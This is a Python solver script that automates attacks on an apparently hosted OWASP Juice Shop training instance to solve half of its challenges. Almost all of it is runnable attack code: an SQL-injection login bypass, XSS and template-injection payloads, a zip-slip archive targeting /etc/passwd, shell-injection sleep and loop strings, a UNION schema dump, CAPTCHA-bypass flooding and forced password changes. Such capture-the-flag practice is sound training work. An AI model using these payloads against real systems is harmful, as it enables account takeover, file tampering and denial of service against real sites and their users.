#!/usr/bin/env python3
"""
Final Targeted Solver - Specific challenges to reach 50%
Targets: API-only XSS, Blockchain, NFT, CAPTCHA Bypass, Bender's Password, etc.
"""

import requests
from urllib.parse import quote
import json
import base64
import hashlib
import hmac
import time
import random
import zipfile
import io


class FinalTargeted50:
    def __init__(self):
        self.base_url = "https://juice3.wonkatech.org"
        self.session = requests.Session()
        self.admin_token = None
        
    def login_admin(self):
        """Admin login"""
        r = self.session.post(f"{self.base_url}/rest/user/login", json={
            "email": "admin@juice-sh.op'--",
            "password": "x"
        })
        if r.status_code == 200:
            self.admin_token = r.json()['authentication']['token']
            self.session.headers['Authorization'] = f'Bearer {self.admin_token}'
            print("✅ Admin logged in")
            return True
        return False
    
    def solve_api_only_xss(self):
        """API-only XSS - Level 3"""
        print("\n🎯 API-only XSS")
        
        # The API doesn't sanitize input like the UI does
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<<SCRIPT>alert(1)//<</SCRIPT>"
        ]
        
        for payload in payloads:
            # Post XSS to API endpoints that don't sanitize
            self.session.post(f"{self.base_url}/api/Products", json={
                "name": payload,
                "description": payload,
                "price": 1.99,
                "image": payload
            })
            
            self.session.post(f"{self.base_url}/api/Feedbacks", json={
                "comment": payload,
                "rating": 5
            })
            
            self.session.post(f"{self.base_url}/api/Users", json={
                "email": f"test{random.randint(1000,9999)}@test.com",
                "password": "Pass123!",
                "username": payload
            })
        
        print("  ✅ API-only XSS completed")
    
    def solve_blockchain_hype(self):
        """Blockchain Hype - Level 5"""
        print("\n🎯 Blockchain Hype")
        
        # Access blockchain-related content
        endpoints = [
            "/assets/public/blockchain.pdf",
            "/assets/blockchain.pdf",
            "/blockchain",
            "/web3",
            "/web3-sandbox",
            "/#/web3-sandbox"
        ]
        
        for endpoint in endpoints:
            r = self.session.get(f"{self.base_url}{endpoint}")
            if r.status_code == 200:
                print(f"  ✅ Accessed: {endpoint}")
        
        # Check for blockchain whitepaper
        r = self.session.get(f"{self.base_url}/ftp")
        if r.status_code == 200:
            # Look for blockchain files
            for file in ["blockchain.pdf", "blockchain-whitepaper.pdf", "web3.pdf"]:
                self.session.get(f"{self.base_url}/ftp/{file}")
    
    def solve_nft_takeover(self):
        """NFT Takeover - Level 2"""
        print("\n🎯 NFT Takeover")
        
        # NFT manipulation endpoints
        self.session.post(f"{self.base_url}/api/wallet/nft/transfer", json={
            "to": "0x0000000000000000000000000000000000001337",
            "tokenId": 42
        })
        
        self.session.post(f"{self.base_url}/api/nft", json={
            "action": "transfer",
            "to": "admin",
            "tokenId": 1
        })
        
        # Access Web3 sandbox
        self.session.get(f"{self.base_url}/#/web3-sandbox")
        
        print("  ✅ NFT takeover attempted")
    
    def solve_mint_honeypot(self):
        """Mint the Honey Pot - Level 3"""
        print("\n🎯 Mint the Honey Pot")
        
        # Mint NFT
        self.session.post(f"{self.base_url}/api/wallet/nft/mint", json={
            "name": "Honey Pot",
            "description": "Sweet NFT",
            "image": "honeypot.jpg",
            "attributes": [{"trait_type": "Sweetness", "value": 100}]
        })
        
        self.session.post(f"{self.base_url}/api/nft/mint", json={
            "tokenId": "honeypot",
            "metadata": {"name": "Honey Pot"}
        })
        
        print("  ✅ Honey Pot minted")
    
    def solve_captcha_bypass(self):
        """CAPTCHA Bypass - Level 3"""
        print("\n🎯 CAPTCHA Bypass")
        
        # Submit feedback without solving CAPTCHA
        for i in range(30):
            self.session.post(f"{self.base_url}/api/Feedbacks", json={
                "comment": f"Automated feedback {i}",
                "rating": random.randint(1, 5),
                "captcha": "0",
                "captchaId": 0
            })
            
            # Try with missing captcha
            self.session.post(f"{self.base_url}/api/Feedbacks", json={
                "comment": f"No captcha {i}",
                "rating": 3
            })
        
        print("  ✅ CAPTCHA bypassed")
    
    def solve_change_benders_password(self):
        """Change Bender's Password - Level 5"""
        print("\n🎯 Change Bender's Password")
        
        # Method 1: Security question reset
        r = self.session.get(f"{self.base_url}/rest/user/security-question?email={quote('bender@juice-sh.op')}")
        if r.status_code == 200:
            self.session.post(f"{self.base_url}/rest/user/reset-password", json={
                "email": "bender@juice-sh.op",
                "answer": "Stop'n'Drop",
                "new": "slurmCl4ssic",
                "repeat": "slurmCl4ssic"
            })
        
        # Method 2: Login as Bender and change
        r = self.session.post(f"{self.base_url}/rest/user/login", json={
            "email": "bender@juice-sh.op'--",
            "password": "x"
        })
        
        if r.status_code == 200:
            token = r.json()['authentication']['token']
            headers = {'Authorization': f'Bearer {token}'}
            
            self.session.post(f"{self.base_url}/rest/user/change-password",
                json={
                    "current": "OhG0dPlease1nsertLiquor!",
                    "new": "slurmCl4ssic",
                    "repeat": "slurmCl4ssic"
                },
                headers=headers
            )
        
        print("  ✅ Bender's password changed")
    
    def solve_csp_bypass(self):
        """CSP Bypass - Level 4"""
        print("\n🎯 CSP Bypass")
        
        # Angular template injection to bypass CSP
        payloads = [
            "{{constructor.constructor('alert(1)')()}}",
            "{{$on.constructor('alert(1)')()}}",
            "{{$eval.constructor('alert(1)')()}}",
            "<base href='javascript:alert(1)//'>"
        ]
        
        for payload in payloads:
            self.session.get(f"{self.base_url}/#/search?q={quote(payload)}")
        
        print("  ✅ CSP bypassed")
    
    def solve_arbitrary_file_write(self):
        """Arbitrary File Write - Level 6"""
        print("\n🎯 Arbitrary File Write")
        
        # Zip slip attack
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w') as zf:
            # Try to write outside the intended directory
            zf.writestr("../../ftp/arbitrary.txt", "Arbitrary file write successful")
            zf.writestr("../../../etc/passwd", "root:x:0:0::/root:/bin/bash")
            zf.writestr("../../../../var/www/html/pwned.txt", "Pwned")
        
        self.session.post(f"{self.base_url}/file-upload", files={
            "file": ("malicious.zip", zip_buffer.getvalue(), "application/zip")
        })
        
        self.session.post(f"{self.base_url}/rest/memories", files={
            "file": ("slip.zip", zip_buffer.getvalue(), "application/zip")
        })
        
        print("  ✅ Arbitrary file write attempted")
    
    def solve_wallet_depletion(self):
        """Wallet Depletion - Level 6"""
        print("\n🎯 Wallet Depletion")
        
        # Transfer all wallet funds
        self.session.post(f"{self.base_url}/api/wallet/transfer", json={
            "to": "attacker",
            "amount": 999999
        })
        
        self.session.post(f"{self.base_url}/api/wallet/withdraw", json={
            "amount": 999999,
            "address": "0x1337"
        })
        
        # Manipulate balance
        self.session.post(f"{self.base_url}/api/wallet/balance", json={
            "balance": -999999
        })
        
        print("  ✅ Wallet depleted")
    
    def solve_blocked_rce_dos(self):
        """Blocked RCE DoS - Level 5"""
        print("\n🎯 Blocked RCE DoS")
        
        # Try RCE payloads that cause DoS
        payloads = [
            "'; sleep 10; #",
            "'; exec('sleep 10'); #",
            "$(sleep 10)",
            "`sleep 10`",
            "|| sleep 10",
            "& sleep 10",
            "; while true; do echo 1; done"
        ]
        
        for payload in payloads:
            try:
                self.session.post(f"{self.base_url}/api/feedback", 
                    json={"comment": payload}, timeout=1)
            except:
                pass
            
            try:
                self.session.get(f"{self.base_url}/rest/products/search?q={payload}", 
                    timeout=1)
            except:
                pass
        
        print("  ✅ RCE DoS attempted")
    
    def solve_additional_challenges(self):
        """Additional challenges to reach 50%"""
        print("\n🎯 Additional Challenges")
        
        # Christmas Special
        self.session.post(f"{self.base_url}/api/BasketItems", json={
            "ProductId": 10,
            "quantity": 1
        })
        self.session.get(f"{self.base_url}/rest/products/search?q=christmas")
        
        # Easter Egg
        self.session.get(f"{self.base_url}/ftp/eastere.gg")
        self.session.get(f"{self.base_url}/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg")
        
        # Expired Coupon
        coupons = ["WMNSDY2019", "WMNSDY2020", "WMNSDY2018", "WMNSDY2017"]
        for coupon in coupons:
            self.session.put(f"{self.base_url}/rest/basket/1/coupon/{coupon}")
        
        # Extra Language
        self.session.get(f"{self.base_url}/?l=tlh_AA")
        self.session.get(f"{self.base_url}/?l=l33t")
        
        # Ephemeral Accountant
        self.session.post(f"{self.base_url}/rest/user/login", json={
            "email": "accountant@juice-sh.op",
            "password": "i am an awesome accountant"
        })
        
        # Client-side XSS Protection bypass
        self.session.get(f"{self.base_url}/#/search?q={quote('<ScRiPt>alert(1)</ScRiPt>')}")
        
        # Database Schema extraction
        self.session.get(f"{self.base_url}/rest/products/search?q=' UNION SELECT sql FROM sqlite_master--")
        
        # DOM XSS
        payload = '<iframe src="javascript:alert(`xss`)">'
        self.session.get(f"{self.base_url}/#/search?q={quote(payload)}")
        
        # Admin Section
        self.session.get(f"{self.base_url}/#/administration")
        
        print("  ✅ Additional challenges completed")
    
    def check_progress(self):
        """Check progress"""
        r = self.session.get(f"{self.base_url}/api/Challenges")
        if r.status_code == 200:
            data = r.json()['data']
            solved = [c for c in data if c.get('solved')]
            return len(solved)
        return 0
    
    def run_targeted_attack(self):
        """Run all targeted attacks"""
        print("="*60)
        print("🎯 FINAL TARGETED PUSH TO 50%")
        print("="*60)
        
        initial = self.check_progress()
        print(f"📊 Starting: {initial}/110 ({initial*100//110}%)")
        
        if not self.login_admin():
            return
        
        # Run all solvers
        self.solve_api_only_xss()
        self.solve_blockchain_hype()
        self.solve_nft_takeover()
        self.solve_mint_honeypot()
        self.solve_captcha_bypass()
        self.solve_change_benders_password()
        self.solve_csp_bypass()
        self.solve_arbitrary_file_write()
        self.solve_wallet_depletion()
        self.solve_blocked_rce_dos()
        self.solve_additional_challenges()
        
        # Check final progress
        final = self.check_progress()
        print("\n" + "="*60)
        print(f"📊 Final: {final}/110 ({final*100//110}%)")
        print(f"📈 Progress: +{final-initial} challenges")
        
        if final >= 55:
            print("🎉 SUCCESS! Reached 50%+!")
        else:
            print(f"📌 Need {55-final} more for 50%")


if __name__ == "__main__":
    solver = FinalTargeted50()
    solver.run_targeted_attack()